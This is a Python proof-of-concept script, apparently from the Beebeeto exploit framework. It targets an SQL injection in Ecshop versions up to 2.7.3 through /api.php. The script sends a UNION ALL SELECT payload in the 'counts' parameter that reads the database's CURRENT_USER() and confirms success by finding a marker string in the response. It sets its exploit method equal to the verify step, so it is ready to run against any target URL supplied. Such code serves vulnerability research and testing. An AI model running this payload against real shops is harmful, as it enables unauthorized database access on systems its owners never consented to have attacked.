#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0019',
            'name': 'ecshop 2.7.3 /api.php SQL注入漏洞 POC',
            'author': '雷锋',
            'create_date': '2015-01-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Ecshop',
            'vul_version': ['<=2.7.3'],
            'type': 'SQL Injection',
            'tag': ['Ecshop漏洞', 'SQL注入漏洞', '/api.php', 'php'],
            'desc': 'N/A',
            'references': ['N/A',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/api.php'
        canshu = {'return_data':'json',
                'ac':'1',
                'act':'search_goods_list',
                'api_version':'1.0',
                'last_modify_st_time':'1',
                'last_modify_en_time':'1',
                'pages':'1',
                'counts':'1 UNION ALL SELECT NULL,CONCAT(0x666630303030,IFNULL(CAST(CURRENT_USER()AS CHAR),0x20),0x20)#'}
        data = urllib.urlencode(canshu)
        req = urllib2.urlopen(verify_url, data)
        content = req.read()

        if 'ff0000' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())